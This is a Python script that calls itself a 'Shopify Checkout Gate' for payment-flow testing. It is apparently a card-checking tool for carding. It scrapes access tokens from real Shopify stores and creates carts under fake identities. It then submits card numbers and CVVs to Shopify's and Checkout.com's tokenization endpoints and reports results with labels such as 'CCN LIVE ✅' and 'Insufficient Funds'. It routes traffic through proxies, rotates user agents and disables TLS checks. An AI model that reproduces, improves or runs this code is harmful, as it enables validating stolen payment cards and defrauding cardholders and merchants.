"""
Shopify Checkout Gate - Updated for 2025+
Uses Cart API (GraphQL) + PCI tokenization endpoint
Supports database-backed store/product cycling for payment flow testing
"""

import requests
import random
import re
import time
import json
import urllib3
from typing import Tuple, Optional
from urllib.parse import urlparse
from faker import Faker

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SHOPIFY_STORES = [
    "kyliecosmetics.com",
    "fashionnova.com",
    "allbirds.com",
    "colourpop.com",
    "gymshark.com",
    "skims.com",
    "brooklinen.com",
]

def get_store_from_db() -> Optional[dict]:
    """Get a random store with products from database"""
    try:
        from tools.shopify_scraper import get_next_store_for_checkout
        return get_next_store_for_checkout()
    except Exception:
        return None

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

def normalize_proxy(proxy) -> Optional[dict]:
    """Normalize proxy to dict format"""
    if not proxy:
        return None
    if isinstance(proxy, dict):
        return proxy
    if isinstance(proxy, str):
        parts = proxy.split(':')
        if len(parts) == 4:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            proxy_url = f"http://{parts[0]}:{parts[1]}"
        else:
            proxy_url = proxy if proxy.startswith('http') else f"http://{proxy}"
        return {'http': proxy_url, 'https': proxy_url}
    return None


def get_storefront_access_token(session: requests.Session, base_url: str) -> Optional[str]:
    """Extract Storefront API access token from store"""
    try:
        resp = session.get(base_url, timeout=10)
        if resp.status_code != 200:
            return None
        
        patterns = [
            r'"accessToken"\s*:\s*"([a-f0-9]+)"',
            r'storefrontAccessToken["\']?\s*[=:]\s*["\']([a-f0-9]+)',
            r'X-Shopify-Storefront-Access-Token["\']?\s*[=:]\s*["\']([a-f0-9]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, resp.text)
            if match:
                return match.group(1)
        
        return None
    except Exception:
        return None


def find_product_variant(session: requests.Session, base_url: str) -> Tuple[Optional[str], float]:
    """Find an available product variant using REST API"""
    try:
        resp = session.get(f"{base_url}/products.json?limit=50", timeout=10)
        if resp.status_code != 200:
            return None, 0.0
        
        products = resp.json().get('products', [])
        
        for product in products[:30]:
            variants = product.get('variants', [])
            for variant in variants:
                if not variant.get('id'):
                    continue
                
                try:
                    price = float(variant.get('price', 99999))
                except (ValueError, TypeError):
                    continue
                
                is_available = variant.get('available', True)
                
                if is_available and 0.50 <= price <= 100.0:
                    variant_gid = f"gid://shopify/ProductVariant/{variant['id']}"
                    return variant_gid, price
        
        for product in products[:5]:
            variants = product.get('variants', [])
            for variant in variants:
                if variant.get('id') and variant.get('available', True):
                    try:
                        price = float(variant.get('price', 0))
                        variant_gid = f"gid://shopify/ProductVariant/{variant['id']}"
                        return variant_gid, price
                    except:
                        pass
                        
    except Exception:
        pass
    
    return None, 0.0


def create_cart_graphql(session: requests.Session, base_url: str, 
                        storefront_token: str, variant_gid: str) -> Optional[str]:
    """Create cart using Storefront API GraphQL (2025+ compatible)"""
    fake = Faker()
    
    graphql_url = f"{base_url}/api/2025-01/graphql.json"
    
    query = """
    mutation cartCreate($input: CartInput!) {
      cartCreate(input: $input) {
        cart {
          id
          checkoutUrl
        }
        userErrors {
          field
          message
        }
      }
    }
    """
    
    variables = {
        "input": {
            "lines": [
                {
                    "merchandiseId": variant_gid,
                    "quantity": 1
                }
            ],
            "buyerIdentity": {
                "email": fake.email(),
                "countryCode": "US"
            }
        }
    }
    
    headers = {
        "Content-Type": "application/json",
        "X-Shopify-Storefront-Access-Token": storefront_token,
        "User-Agent": random.choice(USER_AGENTS),
    }
    
    try:
        resp = session.post(
            graphql_url,
            headers=headers,
            json={"query": query, "variables": variables},
            timeout=15
        )
        
        if resp.status_code == 200:
            data = resp.json()
            cart = data.get("data", {}).get("cartCreate", {}).get("cart", {})
            return cart.get("checkoutUrl")
        
        return None
    except Exception:
        return None


def create_cart_rest(session: requests.Session, base_url: str, variant_id: int) -> Optional[str]:
    """Fallback: Create cart using REST API"""
    try:
        add_resp = session.post(
            f"{base_url}/cart/add.js",
            json={"id": variant_id, "quantity": 1},
            timeout=10
        )
        
        if add_resp.status_code not in [200, 201]:
            session.post(
                f"{base_url}/cart/add.js",
                data={"id": variant_id, "quantity": 1},
                timeout=10
            )
        
        cart_resp = session.get(f"{base_url}/cart.json", timeout=10)
        cart_data = cart_resp.json()
        checkout_url = cart_data.get('checkout_url')
        
        if not checkout_url and cart_data.get('token'):
            checkout_url = f"{base_url}/checkout?cart={cart_data['token']}"
        
        return checkout_url
        
    except Exception:
        return None


def tokenize_card_pci(session: requests.Session, domain: str, card_num: str, 
                      card_mon: str, card_yer: str, card_cvc: str) -> Tuple[str, dict]:
    """
    Tokenize card via Shopify PCI endpoint
    This endpoint validates the card and returns status without completing checkout
    
    Returns: (status_message, details_dict)
    """
    fake = Faker()
    year = int(card_yer) if len(card_yer) == 4 else int(f"20{card_yer}")
    
    pci_headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://checkout.shopifycs.com',
        'referer': 'https://checkout.shopifycs.com/',
        'user-agent': random.choice(USER_AGENTS),
    }
    
    card_data = {
        'credit_card': {
            'number': card_num,
            'month': int(card_mon),
            'year': year,
            'verification_value': card_cvc,
            'name': fake.name(),
        },
        'payment_session_scope': domain,
    }
    
    try:
        resp = session.post(
            'https://deposit.us.shopifycs.com/sessions',
            headers=pci_headers,
            json=card_data,
            timeout=15
        )
        
        result = resp.json() if resp.status_code in [200, 201, 400, 402, 422] else {}
        
        if resp.status_code == 200 or resp.status_code == 201:
            session_id = result.get('id')
            if session_id:
                return "CCN LIVE ✅ Tokenized", {"session_id": session_id, "status": "success"}
            else:
                return "CCN LIVE ✅ Valid Response", {"status": "success"}
        
        error = result.get('error', {})
        error_code = error.get('code', '')
        error_message = error.get('message', '').lower()
        
        if error_code == 'invalid_cvc' or 'cvc' in error_message or 'cvv' in error_message:
            return "CCN LIVE ✅ CVV Mismatch", {"status": "ccn_live", "reason": "cvv"}
        
        if error_code == 'card_declined' or 'declined' in error_message:
            if 'insufficient' in error_message:
                return "CCN LIVE ✅ Insufficient Funds", {"status": "ccn_live", "reason": "nsf"}
            return "DECLINED ❌ Card Declined", {"status": "declined"}
        
        if error_code == 'expired_card' or 'expired' in error_message:
            return "DECLINED ❌ Expired Card", {"status": "declined", "reason": "expired"}
        
        if error_code == 'invalid_number' or 'invalid' in error_message:
            return "DECLINED ❌ Invalid Card", {"status": "declined", "reason": "invalid"}
        
        if 'test' in error_message and 'live' in error_message:
            return "DECLINED ❌ Test Card in Live Mode", {"status": "declined", "reason": "test_card"}
        
        if resp.status_code == 422:
            return "CCN LIVE ✅ Validation Response", {"status": "ccn_live"}
        
        if error_message:
            return f"DECLINED ❌ {error_message[:40]}", {"status": "declined"}
        return "UNKNOWN ⚠️ Response Unrecognized", {"status": "unknown"}
        
    except requests.exceptions.Timeout:
        return "Error: Timeout", {"status": "error"}
    except requests.exceptions.ConnectionError:
        return "Error: Connection Failed", {"status": "error"}
    except Exception as e:
        return f"Error: {str(e)[:40]}", {"status": "error"}


def tokenize_card_checkout_com(session: requests.Session, card_num: str, 
                                card_mon: str, card_yer: str) -> Tuple[str, dict]:
    """
    Alternative: Tokenize via Checkout.com endpoint (used by some Shopify stores)
    """
    year = int(card_yer) if len(card_yer) == 4 else int(f"20{card_yer}")
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://checkout-web-components.checkout.com',
        'referer': 'https://checkout-web-components.checkout.com/',
        'user-agent': random.choice(USER_AGENTS),
    }
    
    payload = {
        "type": "card",
        "expiry_month": int(card_mon),
        "expiry_year": year,
        "number": card_num,
        "name": "John Doe",
        "consumer_wallet": {}
    }
    
    try:
        resp = session.post(
            "https://card-acquisition-gateway.checkout.com/tokens",
            headers=headers,
            json=payload,
            timeout=15
        )
        
        if resp.status_code == 200:
            result = resp.json()
            token = result.get('token')
            if token:
                return "CCN LIVE ✅ Tokenized (CKO)", {"token": token, "status": "success"}
        
        if 'declined' in resp.text.lower():
            return "DECLINED ❌ Card Declined", {"status": "declined"}
        
        return "Error: Tokenization Failed", {"status": "error"}
        
    except Exception as e:
        return f"Error: {str(e)[:40]}", {"status": "error"}


def shopify_checkout_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                           shopify_url: str = None, proxy = None) -> Tuple[str, bool]:
    """
    Shopify card check flow (2025+ compatible):
    1. Find store with available product
    2. Create cart (for session establishment)
    3. Tokenize card via PCI endpoint
    4. Return tokenization result (no checkout completion needed)
    
    The tokenization response tells us:
    - Card is valid/invalid
    - CVV matches/mismatches
    - Card is live or dead
    
    Returns: (status_message, proxy_alive)
    """
    proxy_alive = False
    start_time = time.time()
    
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    
    proxy_dict = normalize_proxy(proxy)
    if proxy_dict:
        session.proxies.update(proxy_dict)
    
    if shopify_url:
        stores = [shopify_url]
    else:
        db_store = get_store_from_db()
        if db_store:
            stores = [db_store['url']]
        else:
            stores = random.sample(SHOPIFY_STORES, min(3, len(SHOPIFY_STORES)))
    
    for store in stores:
        try:
            if not store.startswith('http'):
                store = f"https://{store}"
            
            parsed = urlparse(store)
            domain = parsed.netloc
            base_url = f"https://{domain}"
            
            test_resp = session.get(f"{base_url}/products.json?limit=1", timeout=8)
            if test_resp.status_code != 200:
                continue
            
            proxy_alive = True
            
            result, details = tokenize_card_pci(
                session, domain, card_num, card_mon, card_yer, card_cvc
            )
            
            elapsed = round(time.time() - start_time, 2)
            
            if details.get("status") == "error" and "Timeout" not in result:
                alt_result, alt_details = tokenize_card_checkout_com(
                    session, card_num, card_mon, card_yer
                )
                if alt_details.get("status") != "error":
                    result = alt_result
                    details = alt_details
            
            if "CCN LIVE" in result or "APPROVED" in result:
                return (f"{result} [{domain}] [{elapsed}s]", proxy_alive)
            elif "DECLINED" in result:
                return (f"{result} [{domain}]", proxy_alive)
            else:
                return (f"{result} [{domain}]", proxy_alive)
                
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.RequestException:
            continue
        except Exception:
            continue
    
    return ("Error: All stores failed", proxy_alive)


if __name__ == "__main__":
    result, alive = shopify_checkout_check("4223240003853798", "12", "27", "621")
    print(f"Result: {result}")
    print(f"Proxy OK: {alive}")
